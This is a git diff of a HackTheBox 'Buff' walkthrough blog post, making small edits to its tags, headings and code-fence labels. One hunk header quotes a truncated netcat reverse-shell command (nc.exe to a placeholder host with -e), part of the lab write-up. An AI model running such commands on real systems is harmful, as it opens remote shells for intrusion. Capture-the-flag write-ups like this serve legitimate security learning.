@@ -4,11 +4,9 @@ title: HackTheBox Buff walktthrough
 subtitle: First infosec blog post
 gh-repo: c00rni/c00rni.github.io
 gh-badge: [star, fork, follow]
-tags: [enumeration, hackthebox, netcat, plink, powershell, windows]
+tags: [enumeration, hackthebox, netcat, plink, powershell, windows, msfvenom]
 comments: true
 ---
-
-## Introduction
 
 Buff is a machine on [HackTheBox](https://www.hackthebox.eu/) platform with the IP address 10.10.10.198. The machine is vulnerable to multiple CVE which are easy to find. The machine has been rated Easy by the community. When I wrote this walkthrough, Buff wasn't retired yet. Please don't cheat and solve the box by yourself if you didn't get root flag. The purpose of HacktTheBox is to learn and trying by yourself is the best way to do it.
 
@@ -78,7 +76,7 @@ Opened the port 1234 for incoming connection and execute `nc.exe X.X.X.X 1234 -e
 
 Ok. So I'm logged in windows x64 machine as Shaun. Let's begin or research from Shaun home directory to see what's there
 
-```batch
+```cmd
 c:\Users\shaun>dir *.txt or *.exe /s /b
 ...
 c:\Users\shaun\Desktop\user.txt
